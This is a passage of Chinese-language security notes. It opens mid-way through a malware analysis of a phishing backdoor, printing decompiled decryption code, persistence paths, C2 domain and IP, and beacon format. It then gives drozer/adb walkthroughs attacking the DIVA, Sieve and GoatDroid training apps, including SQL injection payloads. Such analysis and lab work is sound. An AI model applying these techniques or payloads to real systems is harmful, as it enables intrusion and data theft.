0; i \u0026lt; 2816; ++i ) { counter = 0; v5 = (char *)\u0026amp;Enc_Task_exe + 16 * i + 15; do *((_BYTE *)lpBuffer + counter++) = *v5-- ^ 6; while ( counter \u0026lt; 0x10 ); WriteFile(FileA, lpBuffer, 0x10u, \u0026amp;NumberOfBytesWritten, 0); } operator delete(lpBuffer); CloseHandle(FileA); } } ::: 我簡單的寫了一個python script去驗證他，如下: :::spoiler\nfrom Crypto.Util.number import long_to_bytes BUFFER_SIZE = 16 num_iterations = 2816 lpBuffer = b\u0026#34;\u0026#34; unk_10005030 = open(\u0026#39;Enc_Task_exe.txt\u0026#39;, \u0026#39;r\u0026#39;).read().split(\u0026#39; \u0026#39;) FileA = open(\u0026#39;Dec_Task_exe.txt\u0026#39;, \u0026#39;wb\u0026#39;) # Loop through the iterations for i in range(num_iterations): counter = 15 while counter \u0026gt;= 0: current_byte = unk_10005030[i * BUFFER_SIZE + counter] lpBuffer += long_to_bytes(ord(bytes.fromhex(current_byte)) ^ 6) counter -= 1 FileA.write(lpBuffer) ::: 同時他也create了一個LNK file在\nC:\\Users\\REM\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WordPress.lnk 詳細的c code如下 :::spoiler\nvoid CreateLNK(char *a1, char *a2, char *a3, char *a4, ...) { void *v4; // ecx bool v5; // sf int v6; // edx LPVOID ppv; // [esp+40h] [ebp-4h] BYREF void *retaddr; // [esp+44h] [ebp+0h] int v9; // [esp+58h] [ebp+14h] va_list va; // [esp+5Ch] [ebp+18h] BYREF va_start(va, a4); v9 = va_arg(va, _DWORD); ppv = v4; if ( CoInitialize(0) \u0026gt;= 0 ) { if ( CoCreateInstance(\u0026amp;rclsid, 0, 1u, \u0026amp;riid, \u0026amp;ppv) \u0026gt;= 0 ) { (*(*ppv + 80))(ppv, a1, ppv); (*(*retaddr + 44))(retaddr, a3); (*(*retaddr + 68))(retaddr, v9, 0); (*(*retaddr + 60))(retaddr, 7); if ( (**retaddr)(retaddr, \u0026amp;unk_10004100, \u0026amp;a2) \u0026gt;= 0 ) { v5 = (*(*a2 + 24))(a2, a4, 0) \u0026lt; 0; ppv = a2; v6 = *a2; if ( !v5 ) { (*(v6 + 8))(); (*(*ppv + 8))(ppv); CoUninitialize(); return; } (*(v6 + 8))(ppv); } (*(*retaddr + 8))(retaddr); } CoUninitialize(); } } ::: 雖然看的不是很懂，但總之這個LNK內部儲存的東西如下，簡單來說就是用rundll32.exe跑剛剛解密的taskhost.exe:\nC:\\WINDOWS\\system32\\rundll32.exe url.dll,FileProtocolHandler %TMP%\\taskhost.exe 只要打開內容看一下就知道了，當然如果可以用工具parse一下會更準確，但礙於時間的關係就先往下分析 Analyze taskhost.exe 請查閱後門功能這個Section\n通訊協定 # 因為我沒有實際架一個server讓他連線，所以我是直接錄一個失敗的connection，看他丟了什麼出來 :::danger 如果之後還有時間可以想辦法架一個C2 Server，實際去構造連線的封包 :::\n加解密演算法 # 如上所述\n後門功能 # 先說明一下這個後門在幹麻，順一下流程\n在main function中實作了一個MD5 hash function，並且從0開始算直到符合ef775988943825d2871e1cfa75473ec0，其實這個就是99999999，我不太確定這一段為什麼要做這件事，可能的原因我想有兩個，其一是想要做到PoW的效果，其二是不想要太快執行到關鍵的地方，讓使用者可以放下戒心，但兩個原因都不太能說服自己就是了 接著他decode出了類似port的1228這個數字和C2 server name:==uacmoscow.com==，我不太確定這個1228是幹嘛的 接著進入到while loop想辦法fetch到電腦的一些資訊: Local IP OEM Code Tick Count(從開機時間開始到現在過了多久) 目前電腦的架構是多少 OS版本 Domain Name Username Computer Name Proxy Server有無開啟 先組織好URI→/ru/order/index.php?strPageID=2396956864，以我的VM為例，我的IP是192.168.222.142，換算成hex就是0x8edea8c0 用base32 encode前面得到的所有電腦資訊，以我的VM為例: KNFVIT2QFUZEGM2JKFEE6AYAKJCU2DYAIRCVGS2UJ5IC2MSDGNEVCSCPAAAAIABRGIZDQ=== 建構封包: Host: uacmoscow.com Connection: keep-alive Accept: */* User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36 Accept-Encoding: gzip, deflate Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7 Cookie: JSESSIONID=AHAKRXUOWUAQAAGUHPKAIAAAAAAAMAAAAABAAAAAAEHQARCFKNFVIT2QFUZEGM2JKFEE6AYAKJCU2DYAIRCVGS2UJ5IC2MSDGNEVCSCPAAAAIABRGIZDQ=== 嘗試用Get方式傳送出去，但是因為這個domain掛了，所以有關於連線的地方大部分都是靜態去看 如果連線成功他就可以執行以下幾件事情: 獲取所有目前process的相關資訊後，利用Post傳送出去→/xhome.native.page/datareader.php?sid=2396956864 終止Process 開Shell 從Server傳送資料到Local 常駐方式 # 目前我看到的部分就只有創了以下兩個檔案，前者是只要victim打開word就會觸發到的機置，後者則是當用戶登錄到 Windows 系統時，系統會自動檢查這個目錄，並運行其中的程序或快捷方式\nC:\\Users\\REM\\AppData\\Roaming\\Microsoft\\Word\\STARTUP\\intel.wll C:\\Users\\REM\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WordPress.lnk 中繼站 # 基本資訊 # IP: 58.158.177.102 Domain: uacmoscow.com\n關連資訊 # 該IP可能來源於日本 :::danger 根據面試官的說明，這個IP已經被資安公司註冊了，變成如果有Victim連線到這個IP，資安公司就會直接通知，以便做後續的IR或是防止更大範圍的受害 :::\n威脅情資 # 攻擊者 # 不確定\n攻擊時間 # 不確定\n受害者 # 不確定 :::danger 如果把RTF的內容實際打開去看裡面的內容，會發現是一個會議紀錄，如果再更詳細的OSINT可能可以針對這一點去看有可能的受害者是誰 :::\nReference # Any.Run Analyze Phishing Mail 某個以釣魚郵件發起的 APT 攻擊\n什麼是XLAM文件擴展名？\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nExcel如何查看VBA代码？\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nExcel教程小白必学技巧 20：调出开发工具选项卡 \u0026#160;\u0026#x21a9;\u0026#xfe0e;\n富文本格式\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nVirusTotal CVE-2017-11882\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nCVE-2017-11882 Office棧溢出漏洞分析\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nOffice系列漏洞之CVE-2017-11882\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":480,"href":"/tools/others/android-related/drozer/test-diva/test-diva---activity-exported/","title":"Test DIVA - activity exported","section":"Tools","content":" DIVA - Download Test DIVA - activity exported # 參考1234\n起手式 - 確認App資訊\ndz\u0026gt; run app.package.list -f diva Attempting to run shell module jakhar.aseem.diva (Diva) dz\u0026gt; run app.package.info -a jakhar.aseem.diva Attempting to run shell module Package: jakhar.aseem.diva Application Label: Diva Process Name: jakhar.aseem.diva Version: 1.0 Data Directory: /data/user/0/jakhar.aseem.diva APK Path: /data/app/~~ieYmYeSxvDRbS7R8da3n_g==/jakhar.aseem.diva--xnWMS5i2UVEuuoE1JHskg==/base.apk UID: 10282 GID: [3003] Shared Libraries: [/system/framework/android.test.base.jar, /system/framework/org.apache.http.legacy.jar] Shared User ID: null Uses Permissions: - android.permission.WRITE_EXTERNAL_STORAGE - android.permission.READ_EXTERNAL_STORAGE - android.permission.INTERNET - android.permission.POST_NOTIFICATIONS - android.permission.ACCESS_MEDIA_LOCATION - android.permission.READ_MEDIA_AUDIO - android.permission.READ_MEDIA_VIDEO - android.permission.READ_MEDIA_IMAGES Defines Permissions: - None dz\u0026gt; run app.package.attacksurface jakhar.aseem.diva Attempting to run shell module Attack Surface: 3 activities exported 0 broadcast receivers exported 1 content providers exported 0 services exported is debuggable package name: jakhar.aseem.diva attack surface: activities exported/content providers exported/is debuggable\n確認activiy的資訊\ndz\u0026gt; run app.activity.info -a jakhar.aseem.diva Attempting to run shell module Package: jakhar.aseem.diva jakhar.aseem.diva.MainActivity Permission: null jakhar.aseem.diva.APICredsActivity Permission: null jakhar.aseem.diva.APICreds2Activity Permission: null 目前有兩個被export的activity，分別啟動後如下\ndz\u0026gt; run app.activity.start --component jakhar.aseem.diva jakhar.aseem.diva.APICredsActivity ![Screenshot_20240604-155745](https://hackmd.io/_uploads/By3VCB340.png =200x)\ndz\u0026gt; run app.activity.start --component jakhar.aseem.diva jakhar.aseem.diva.APICreds2Activity ![Screenshot_20240604-161940](https://hackmd.io/_uploads/ryTHAS3EA.png =200x) 按照3的說明，這是==9.Access Control Issue - Part 1==題目的畫面，原本的設想是不要按VIEW API CREDENTIALS這個按鈕也可以取得上面的機敏資料\n另外一種解法 # 按照3作者用另外一種方式去load這個activity，先看AndroidManifest.xml，當中有特別寫到這個activity是用intent-filter當作這個activity的類似保護的東西\n\u0026lt;activity android:label=\u0026#34;@string/apic_label\u0026#34; android:name=\u0026#34;jakhar.aseem.diva.APICredsActivity\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;jakhar.aseem.diva.action.VIEW_CREDS\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; \u0026lt;activity android:label=\u0026#34;@string/apic2_label\u0026#34; android:name=\u0026#34;jakhar.aseem.diva.APICreds2Activity\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action android:name=\u0026#34;jakhar.aseem.diva.action.VIEW_CREDS2\u0026#34;/\u0026gt; \u0026lt;category android:name=\u0026#34;android.intent.category.DEFAULT\u0026#34;/\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/activity\u0026gt; 會發現前面找到的兩個activity都出現在這邊，那是否我可以直接用adb，啟動這個activity，並且給予他指定的intent，答案是肯定的\n$ adb shell am start -n jakhar.aseem.diva/.APICredsActivity -a jakhar.aseem.diva.action.VIEW_CREDS Starting: Intent { act=jakhar.aseem.diva.action.VIEW_CREDS cmp=jakhar.aseem.diva/.APICredsActivity } $ adb shell am start -n jakhar.aseem.diva/.APICreds2Activity -a jakhar.aseem.diva.action.VIEW_CREDS2 Starting: Intent { act=jakhar.aseem.diva.action.VIEW_CREDS2 cmp=jakhar.aseem.diva/.APICreds2Activity } am start: 啟動一個activity -n \u0026lt;package name + /. + activity class name\u0026gt;: 指定哪一個activity -a \u0026lt;specified intent\u0026gt;: 指定的 action，用於告訴應用程式以特定方式處理這個啟動動作\n按照上面的指示，就會出現剛剛一樣的畫面了\nReference # DIVA靶場測試APP客戶端不規範項（一）\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n【技術分享】Android App常見安全問題演練分析系統-DIVA-Part1\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n【技術分享】Android App常見安全問題演練分析系統-DIVA-Part2\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nDrozer Tutorial\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":481,"href":"/tools/others/android-related/drozer/test-diva/test-diva---content-provider-exported---db-based/","title":"Test DIVA - content provider exported - DB Based","section":"Tools","content":" Test DIVA - content provider exported - DB Based # 這一題是第11. Access Control Issues - Part 3，用意是要我們不需要PIN code就可以access儲存起來的notes\n起手式 dz\u0026gt; run app.provider.info -a jakhar.aseem.diva Attempting to run shell module Package: jakhar.aseem.diva Authority: jakhar.aseem.diva.provider.notesprovider Read Permission: null Write Permission: null Content Provider: jakhar.aseem.diva.NotesProvider Multiprocess Allowed: False Grant Uri Permissions: False Uri Permission Patterns: Path Permissions: dz\u0026gt; run scanner.provider.finduris -a jakhar.aseem.diva Attempting to run shell module Scanning jakhar.aseem.diva... No respone from content URI: content://jakhar.aseem.diva.provider.notesprovider/ Got a response from content Uri: content://jakhar.aseem.diva.provider.notesprovider/notes No respone from content URI: content://jakhar.aseem.diva.provider.notesprovider Got a response from content Uri: content://jakhar.aseem.diva.provider.notesprovider/notes/ For sure accessible content URIs: content://jakhar.aseem.diva.provider.notesprovider/notes content://jakhar.aseem.diva.provider.notesprovider/notes/ 從以上測試結果可以知道jakhar.aseem.diva.NotesProvider的狀況，以及對應的URI為何 逆向 從NotesProvider這個class可以知道他就是一個負責管理Notes資料庫的一個class，並且同時負責query/update/insert/delete這幾個function，那我們是不是也可以用和Sieve類似的方法對這個database發出request query/insert/update/delete/sqli query 我們達到了一開始題目的要求，只需要直接query就好了 dz\u0026gt; run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --vertical Attempting to run shell module _id 5 title Exercise note Alternate days running _id 4 title Expense note Spent too much on home theater _id 6 title Weekend note b333333333333r _id 3 title holiday note Either Goa or Amsterdam _id 2 title home note Buy toys for baby, Order dinner _id 1 title office note 10 Meetings. 5 Calls. Lunch with CEO insert dz\u0026gt; run app.provider.insert content://jakhar.aseem.diva.provider.notesprovider/notes --integer _id 7 --string title pwn1 --string note pwnpwn1 Attempting to run shell module Done. dz\u0026gt; run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes Attempting to run shell module | _id | title | note | | 5 | Exercise | Alternate days running | | 4 | Expense | Spent too much on home theater | | 6 | Weekend | b333333333333r | | 3 | holiday | Either Goa or Amsterdam | | 2 | home | Buy toys for baby, Order dinner | | 1 | office | 10 Meetings. 5 Calls. Lunch with CEO | | 7 | pwn1 | pwnpwn1 | update dz\u0026gt; run app.provider.update content://jakhar.aseem.diva.provider.notesprovider/notes --selection \u0026#34;_id=?\u0026#34; --selectio n-args 7 --string title pwn2 --string note pwnpwn2 Attempting to run shell module Done. dz\u0026gt; run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes Attempting to run shell module | _id | title | note | | 5 | Exercise | Alternate days running | | 4 | Expense | Spent too much on home theater | | 6 | Weekend | b333333333333r | | 3 | holiday | Either Goa or Amsterdam | | 2 | home | Buy toys for baby, Order dinner | | 1 | office | 10 Meetings. 5 Calls. Lunch with CEO | | 7 | pwn2 | pwnpwn2 | delete dz\u0026gt; run app.provider.delete content://jakhar.aseem.diva.provider.notesprovider/notes --selection \u0026#34;_id=?\u0026#34; --selection -args 7 Attempting to run shell module Done. dz\u0026gt; run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes Attempting to run shell module | _id | title | note | | 5 | Exercise | Alternate days running | | 4 | Expense | Spent too much on home theater | | 6 | Weekend | b333333333333r | | 3 | holiday | Either Goa or Amsterdam | | 2 | home | Buy toys for baby, Order dinner | | 1 | office | 10 Meetings. 5 Calls. Lunch with CEO | sqli 測試的payload如下，的確出現sqli的漏洞，而且可以看到完整的table dz\u0026gt; run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --selection \u0026#34;\u0026#39;\u0026#34; Attempting to run shell module Exception occured: unrecognized token: \u0026#34;\u0026#39;) ORDER BY title\u0026#34; (code 1 SQLITE_ERROR): , while compiling: SELECT * FROM notes WHERE (\u0026#39;) ORDER BY title dz\u0026gt; run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --projection \u0026#34;* FROM SQLITE_MASTER WHERE type=\u0026#39;table\u0026#39;;--\u0026#34; Attempting to run shell module | type | name | tbl_name | rootpage | sql | | table | android_metadata | android_metadata | 3 | CREATE TABLE android_metadata (locale TEXT) | | table | notes | notes | 4 | CREATE TABLE notes (_id INTEGER PRIMARY KEY AUTOINCREMENT, title TEXT NOT NULL, note TEXT NOT NULL) | | table | sqlite_sequence | sqlite_sequence | 5 | CREATE TABLE sqlite_sequence(name,seq) | 也可以透過drozer自動找可能的點 dz\u0026gt; run scanner.provider.injection -a jakhar.aseem.diva Attempting to run shell module Scanning jakhar.aseem.diva... Not Vulnerable: content://jakhar.aseem.diva.provider.notesprovider/ content://jakhar.aseem.diva.provider.notesprovider Injection in Projection: content://jakhar.aseem.diva.provider.notesprovider/notes/ content://jakhar.aseem.diva.provider.notesprovider/notes Injection in Selection: content://jakhar.aseem.diva.provider.notesprovider/notes/ content://jakhar.aseem.diva.provider.notesprovider/notes dz\u0026gt; run scanner.provider.sqltables -a jakhar.aseem.diva Attempting to run shell module Scanning jakhar.aseem.diva... Accessible tables for uri content://jakhar.aseem.diva.provider.notesprovider/notes/: android_metadata notes sqlite_sequence Accessible tables for uri content://jakhar.aseem.diva.provider.notesprovider/notes: android_metadata notes sqlite_sequence "},{"id":482,"href":"/tools/others/android-related/drozer/test-sieve/test-sieve---activities-exported/","title":"Test Sieve - activities exported","section":"Tools","content":" Drozer Seive - 官網, Download Sieve is a small password manager app created to showcase some of the common vulnerabilities found in Android applications.\nTest Sieve - activities exported # 參考12，在測試之前要先點進去Sieve App中設定password和email之類的基本資訊，這樣之後測試才知道哪邊其實是漏洞\n起手式-確認基本資訊 dz\u0026gt; run app.package.list -f Sieve # 確認該App的package name Attempting to run shell module com.mwr.example.sieve (Sieve) dz\u0026gt; run app.package.info -a com.mwr.example.sieve # 確認該App的基本資訊 Attempting to run shell module Package: com.mwr.example.sieve Application Label: Sieve Process Name: com.mwr.example.sieve Version: 1.0 Data Directory: /data/user/0/com.mwr.example.sieve APK Path: /data/app/~~_mRnxjv10ez6OXDQWBrRZw==/com.mwr.example.sieve-yL301IHv87w7debjGy21vA==/base.apk UID: 10285 GID: [3003] Shared Libraries: [/system/framework/android.test.base.jar, /system/framework/org.apache.http.legacy.jar] Shared User ID: null Uses Permissions: - android.permission.READ_EXTERNAL_STORAGE - android.permission.WRITE_EXTERNAL_STORAGE - android.permission.INTERNET - android.permission.POST_NOTIFICATIONS - android.permission.ACCESS_MEDIA_LOCATION - android.permission.READ_MEDIA_AUDIO - android.permission.READ_MEDIA_VIDEO - android.permission.READ_MEDIA_IMAGES Defines Permissions: - com.mwr.example.sieve.READ_KEYS - com.mwr.example.sieve.WRITE_KEYS dz\u0026gt; run app.package.manifest com.mwr.example.sieve # 確認該App的manifest有沒有什麼異常或漏洞的提示 ... dz\u0026gt; run app.package.attacksurface com.mwr.example.sieve # 確認該App的攻擊面有哪些 Attempting to run shell module Attack Surface: 3 activities exported 0 broadcast receivers exported 2 content providers exported 2 services exported is debuggable 看攻擊面的左邊就是該攻擊點有幾個 activities exported 列出exported activities有哪些 dz\u0026gt; run app.activity.info -a com.mwr.example.sieve Attempting to run shell module Package: com.mwr.example.sieve com.mwr.example.sieve.FileSelectActivity Permission: null com.mwr.example.sieve.MainLoginActivity Permission: null com.mwr.example.sieve.PWList Permission: null 啟動activity dz\u0026gt; run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList 此時會看到手機啟動Sieve App，並且原本應該是需要password才能access的activity，居然可以直接bypass ![Screenshot_20240603-163856](https://hackmd.io/_uploads/rkrr-ZsNA.png =200x) Reference # drozer之玩轉sieve\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nDrozer Tutorial\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":483,"href":"/tools/others/android-related/drozer/test-sieve/test-sieve---broadcast-receivers-exported/","title":"Test Sieve - broadcast receivers exported","section":"Tools","content":" Test Sieve - broadcast receivers exported # 這個就不是用Sieve做示範，因為這個App沒有match的receiver\ndz\u0026gt; run app.broadcast.info -a com.mwr.example.sieve Attempting to run shell module Package: com.mwr.example.sieve No matching receivers. 所以我就用之前安裝的goatdroid做示範\n檢查broadcast receiver dz\u0026gt; run app.broadcast.info -a org.owasp.goatdroid.fourgoats Attempting to run shell module Package: org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver Permission: null 確認後就逆向看一下 在org.owasp.goatdroid.fourgoats.broadcastreceivers中有SendSMSNowReceiver這個class，內容如下: public class SendSMSNowReceiver extends BroadcastReceiver { Context context; @Override // android.content.BroadcastReceiver public void onReceive(Context arg0, Intent arg1) { this.context = arg0; SmsManager sms = SmsManager.getDefault(); Bundle bundle = arg1.getExtras(); sms.sendTextMessage(bundle.getString(\u0026#34;phoneNumber\u0026#34;), null, bundle.getString(\u0026#34;message\u0026#34;), null, null); Utils.makeToast(this.context, Constants.TEXT_MESSAGE_SENT, 1); } } Send Something 此時我們就可以用drozer發出一個intent，但是在發出之前要看一下AndroidManifest.xml中對於receiver的描述如下，如果想知道這個intent-filter代表的事情可以參考[^chatgpt-intent-filter]，簡單來說就是所有app都可以發出broadcast，那什麼樣的intent會被goatdroid所接收呢?就是帶有org.owasp.goatdroid.fourgoats.SOCIAL_SMS這個action才會被接收，並且觸發onReceive這個function \u0026lt;manifest versionCode=\u0026#34;1\u0026#34; versionName=\u0026#34;1.0\u0026#34; package=\u0026#34;org.owasp.goatdroid.fourgoats\u0026#34;\u0026gt; ... \u0026lt;application theme=\u0026#34;@2131361870\u0026#34; label=\u0026#34;@2131296266\u0026#34; icon=\u0026#34;@2130837632\u0026#34; debuggable=\u0026#34;true\u0026#34;\u0026gt; ... \u0026lt;receiver label=\u0026#34;Send SMS\u0026#34; name=\u0026#34;.broadcastreceivers.SendSMSNowReceiver\u0026#34;\u0026gt; \u0026lt;intent-filter\u0026gt; \u0026lt;action name=\u0026#34;org.owasp.goatdroid.fourgoats.SOCIAL_SMS\u0026#34;\u0026gt;\u0026lt;/action\u0026gt; \u0026lt;/intent-filter\u0026gt; \u0026lt;/receiver\u0026gt; \u0026lt;/application\u0026gt; ... \u0026lt;/manifest\u0026gt; dz\u0026gt; run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --component org.owasp.goatdroid.fourgoats.broadcastreceivers SendSMSNowReceiver --extra string phoneNumber 123456789 --extra string message \u0026#34;Hello mate!\u0026#34; 因為fourgoat這個App需要一個server，但是原作把server的link下架了，所以我也不知道實際送出這個broadcast會有什麼效果，但就是先紀錄起來，之後有機會可以用 "},{"id":484,"href":"/tools/others/android-related/drozer/test-sieve/test-sieve---content-providers-exported---db-based/","title":"Test Sieve - content providers exported - DB Based","section":"Tools","content":" Test Sieve - content providers exported - DB Based # 如果想知道實際的狀況和content URI是什麼，可以參考ChatGPT的說明\n起手式 從以下command的結果可以知道com.mwr.example.sieve.DBContentProvider和com.mwr.example.sieve.FileBackupProvider的狀況，並且從結果可以知道URI的形式長怎樣 content://com.mwr.example.sieve.DBContentProvider/Keys/ content://com.mwr.example.sieve.DBContentProvider/Passwords/ content://com.mwr.example.sieve.DBContentProvider/Passwords :::spoiler dz\u0026gt; run app.provider.info -a com.mwr.example.sieve Attempting to run shell module Package: com.mwr.example.sieve Authority: com.mwr.example.sieve.DBContentProvider Read Permission: null Write Permission: null Content Provider: com.mwr.example.sieve.DBContentProvider Multiprocess Allowed: True Grant Uri Permissions: False Uri Permission Patterns: Path Permissions: Path: /Keys Type: PATTERN_LITERAL Read Permission: com.mwr.example.sieve.READ_KEYS Write Permission: com.mwr.example.sieve.WRITE_KEYS Authority: com.mwr.example.sieve.FileBackupProvider Read Permission: null Write Permission: null Content Provider: com.mwr.example.sieve.FileBackupProvider Multiprocess Allowed: True Grant Uri Permissions: False Uri Permission Patterns: Path Permissions: dz\u0026gt; run scanner.provider.finduris -a com.mwr.example.sieve Attempting to run shell module Scanning com.mwr.example.sieve... No respone from content URI: content://com.mwr.example.sieve.DBContentProvider/Keys No respone from content URI: content://com.mwr.example.sieve.DBContentProvider/ No respone from content URI: content://com.mwr.example.sieve.DBContentProvider No respone from content URI: content://com.mwr.example.sieve.FileBackupProvider No respone from content URI: content://com.mwr.example.sieve.FileBackupProvider/ Got a response from content Uri: content://com.mwr.example.sieve.DBContentProvider/Keys/ Got a response from content Uri: content://com.mwr.example.sieve.DBContentProvider/Passwords/ Got a response from content Uri: content://com.mwr.example.sieve.DBContentProvider/Passwords For sure accessible content URIs: content://com.mwr.example.sieve.DBContentProvider/Keys/ content://com.mwr.example.sieve.DBContentProvider/Passwords/ content://com.mwr.example.sieve.DBContentProvider/Passwords ::: 逆向 實際去看DBContentProvider這個class，會發現他把所有的query/update/delete/insert function都寫好了，不過我們可以先看初始化的時候onCreate在做的事情 @Override // android.content.ContentProvider public boolean onCreate() { this.pwdb = new PWDBHelper(getContext()); this.sUriMatcher.addURI(\u0026#34;com.mwr.example.sieve.DBContentProvider\u0026#34;, PWTable.TABLE_NAME, 100); this.sUriMatcher.addURI(\u0026#34;com.mwr.example.sieve.DBContentProvider\u0026#34;, \u0026#34;Keys\u0026#34;, KEY); return false; } 再跟進去PWDBHelper，他主要就是管理 Android SQLite 資料庫的class，並進行初始化的動作，接著後續創了兩個table，包含==Passwords==和==Keys==(其實我覺得這個URI應該就類似database的table) query/insert/update/delete/sqli query #Simple Query dz\u0026gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical Attempting to run shell module _id 1 service username password b\u0026#39;Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=\u0026#39; (Base64-encoded) email bernie6401@gmail.com insert 根據上面的描述以及逆向的結果，我可以知道各個欄位的data type，insert的時候就是都加進去就可了 dz\u0026gt; run app.provider.insert content://com.mwr.example.sieve.DBContentProvider/Passwords/ --integer _id 2 --string password bbb --string email aaa@bbb.com Attempting to run shell module Done. dz\u0026gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical Attempting to run shell module _id 1 service username password b\u0026#39;Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=\u0026#39; (Base64-encoded) email bernie6401@gmail.com _id 2 service null username null password bbb email aaa@bbb.com update _id=2的data，被我們改掉了 dz\u0026gt; run app.provider.update content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection \u0026#34;_id=?\u0026#34; --selection-args 2 --string password ccc --string email ddd@eee.com Attempting to run shell module Done. dz\u0026gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical Attempting to run shell module _id 1 service username password b\u0026#39;Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=\u0026#39; (Base64-encoded) email bernie6401@gmail.com _id 2 service null username null password ccc email ddd@eee.com delete 只剩下最一開始我們設定的data dz\u0026gt; run app.provider.delete content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection \u0026#34;_id=?\u0026#34; --selection-args 2 Attempting to run shell module Done. dz\u0026gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical Attempting to run shell module _id 1 service username password b\u0026#39;Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=\u0026#39; (Base64-encoded) email bernie6401@gmail.com sqli 如下結果所示，的確存在sqli，並且可以得到完整的table # 先嘗試丟一些trash byte dz\u0026gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection \u0026#34;\u0026#39;\u0026#34; Attempting to run shell module Exception occured: unrecognized token: \u0026#34;\u0026#39;)\u0026#34; (code 1 SQLITE_ERROR): , while compiling: SELECT * FROM Passwords WHERE (\u0026#39;) dz\u0026gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords --projection \u0026#34;* FROM SQLITE_MASTER WHERE type=\u0026#39;table\u0026#39;;--\u0026#34; Attempting to run shell module | type | name | tbl_name | rootpage | sql | | table | android_metadata | android_metadata | 3 | CREATE TABLE android_metadata (locale TEXT) | | table | Passwords | Passwords | 4 | CREATE TABLE Passwords (_id INTEGER PRIMARY KEY,service TEXT,username TEXT,password BLOB,email ) | | table | Key | Key | 5 | CREATE TABLE Key (Password TEXT PRIMARY KEY,pin TEXT ) 我們也可以用drozer自動幫我們找 dz\u0026gt; run scanner.provider.injection -a com.mwr.example.sieve Attempting to run shell module Scanning com.mwr.example.sieve... Not Vulnerable: content://com.mwr.example.sieve.DBContentProvider content://com.mwr.example.sieve.FileBackupProvider content://com.mwr.example.sieve.DBContentProvider/Keys content://com.mwr.example.sieve.DBContentProvider/ content://com.mwr.example.sieve.FileBackupProvider/ Injection in Projection: content://com.mwr.example.sieve.DBContentProvider/Passwords content://com.mwr.example.sieve.DBContentProvider/Keys/ content://com.mwr.example.sieve.DBContentProvider/Passwords/ Injection in Selection: content://com.mwr.example.sieve.DBContentProvider/Passwords content://com.mwr.example.sieve.DBContentProvider/Keys/ content://com.mwr.example.sieve.DBContentProvider/Passwords/ dz\u0026gt; run scanner.provider.sqltables -a com.mwr.example.sieve Attempting to run shell module Scanning com.mwr.example.sieve... Accessible tables for uri content://com.mwr.example.sieve.DBContentProvider/Passwords: android_metadata Passwords Key Accessible tables for uri content://com.mwr.example.sieve.DBContentProvider/Keys/: android_metadata Passwords Key Accessible tables for uri content://com.mwr.example.sieve.DBContentProvider/Passwords/: android_metadata Passwords Key "},{"id":485,"href":"/tools/others/android-related/drozer/test-sieve/test-sieve---content-providers-exported---file-systembased/","title":"Test Sieve - content providers exported - File SystemBased","section":"Tools","content":" Test Sieve - content providers exported - File SystemBased # 有關於基於File System的Content Provider - 逆向 在com.mwr.example.sieve.FileBackupProvider中可以特別注意onCreate以及ParcelFileDescriptor這個funnction public class FileBackupProvider extends ContentProvider { ... @Override // android.content.ContentProvider public boolean onCreate() { this.sUriMatcher.addURI(\u0026#34;com.mwr.example.sieve.FileBackupProvider\u0026#34;, \u0026#34;*\u0026#34;, DATABASE); return false; } @Override // android.content.ContentProvider public ParcelFileDescriptor openFile(Uri uri, String mode) { int modeCode; if (mode.equals(\u0026#34;r\u0026#34;)) { modeCode = 268435456; } else if (mode.equals(\u0026#34;rw\u0026#34;)) { modeCode = 805306368; } else if (mode.equals(\u0026#34;rwt\u0026#34;)) { modeCode = 805306368; } else { Log.w(TAG, \u0026#34;Unrecognised code to open file: \u0026#34; + mode); return null; } try { return ParcelFileDescriptor.open(new File(uri.getPath()), modeCode); } catch 